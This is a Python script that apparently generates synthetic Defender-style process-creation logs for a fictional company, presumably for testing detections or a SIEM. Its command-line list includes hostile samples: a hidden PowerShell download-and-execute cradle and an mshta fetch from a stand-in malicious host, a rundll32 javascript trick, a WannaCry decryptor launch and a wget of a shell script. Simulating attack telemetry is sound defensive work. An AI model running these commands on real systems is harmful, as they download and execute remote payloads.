
import os
import json
import random
from datetime import datetime, timedelta
from faker import Faker

fake = Faker()

output_dir = "C:\\Output"
os.makedirs(output_dir, exist_ok=True)

TENANT_ID = "d63f3f4b-6e5b-4e10-a8b8-2d7e2a8b5f72"
DOMAIN = "kustoindustries.net"
ACCOUNT_NAMES = ["jdoe", "msmith", "ajones", "bwilliams", "cjohnson", "Admin"]
DEVICE_NAME_OPTIONS = [
    "DC-AD-01", "HR-LPT-001", "SOC-MON-02", "SQLSVR-01", "AVD-POOL-01", "govms01.kustoindustries.net"
]
FILE_NAMES = ["busybox", "conhost.exe", "powershell.exe", "cmd.exe", "sh", "wget"]
FOLDER_PATHS = [
    "/usr/bin", "/usr/sbin", "/bin", "/opt", "/tmp", "/home/attacker", "C:\\Windows\\System32"
]
COMMAND_LINES = [
    "/bin/sh -c 'kill -2 2099014'",
    "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.kustoindustries.com/loader.ps1')",
    "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication\"",
    "C:\\Windows\\System32\\cmd.exe /c start C:\\Users\\Public\\@WanaDecryptor@.exe",
    "mshta.exe http://malicious.kustoindustries.com/fakeupdate.hta",
    "wget http://10.0.0.5:8000/shell.sh -O /tmp/shell.sh"
]

def random_sid():
    return "S-1-5-21-" + "-".join(str(random.randint(1000000000, 9999999999)) for _ in range(3))

def random_hex(n):
    return ''.join(random.choices('0123456789abcdef', k=n))

def generate_additional_fields():
    return json.dumps({
        "InitiatingProcessPosixEffectiveUser": {
            "Name": "root",
            "Uid": 0
        },
        "InitiatingProcessPosixProcessGroupId": 0,
        "InitiatingProcessPosixSessionId": random.randint(1000, 9999),
        "Campaign": "TANGOFOX_Ransom"
    })

def generate_event(index, start_time, delta):
    event_time = start_time + (index * delta)
    account = random.choice(ACCOUNT_NAMES)
    filename = random.choice(FILE_NAMES)
    folder = random.choice(FOLDER_PATHS)
    command = random.choice(COMMAND_LINES)

    return {
        "TenantId": TENANT_ID,
        "AccountDomain": DOMAIN,
        "AccountName": account,
        "AccountObjectId": str(fake.uuid4()),
        "AccountSid": random_sid(),
        "AccountUpn": f"{account}@{DOMAIN}",
        "ActionType": "ProcessCreated",
        "AdditionalFields": generate_additional_fields(),
        "AppGuardContainerId": str(fake.uuid4()),
        "DeviceId": str(fake.uuid4()),
        "DeviceName": random.choice(DEVICE_NAME_OPTIONS),
        "FileName": filename,
        "FolderPath": folder,
        "FileSize": random.randint(1024, 104857600),
        "ProcessCommandLine": command,
        "TimeGenerated": event_time.isoformat(),
        "Timestamp": event_time.isoformat(),
        "Type": "DeviceProcessEvents"
    }

def generate_events(num_events, start_time, end_time, output_file):
    total_seconds = (end_time - start_time).total_seconds()
    delta = timedelta(seconds=(total_seconds / num_events))
    with open(output_file, 'w', encoding='utf-8') as f:
        for i in range(num_events):
            event = generate_event(i, start_time, delta)
            f.write(json.dumps(event) + "\n")

if __name__ == "__main__":
    num_days = 3
    events_per_day = 1000
    total = num_days * events_per_day
    end_time = datetime.utcnow()
    start_time = end_time - timedelta(days=num_days)
    output_file = os.path.join(output_dir, "device_process_events_samplefields.json")
    generate_events(total, start_time, end_time, output_file)
    print(f"✓ Generated {total} DeviceProcessEvents to '{output_file}'")
